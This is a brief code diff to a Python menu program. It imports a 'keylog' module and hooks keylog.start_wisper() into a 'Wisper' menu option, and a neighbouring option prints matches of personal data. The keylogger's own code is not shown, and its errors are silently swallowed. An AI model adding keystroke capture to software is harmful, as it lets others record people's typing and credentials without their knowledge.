@@ -1,3 +1,5 @@
+import keylog
+
 def printFields(fieldList):
   for field in fieldList:
     print("(" + str(fieldList.index(field)) + ") " + field)
@@ -65,7 +67,11 @@ def main():
         
     elif option == '4':
       print("Wisper started. Press ESC to disable Wisper.")
-      
+      try:
+          keylog.start_wisper()
+      except:
+          pass
+
     elif option == '5':
       print("Printing all matches of personal data...")
       
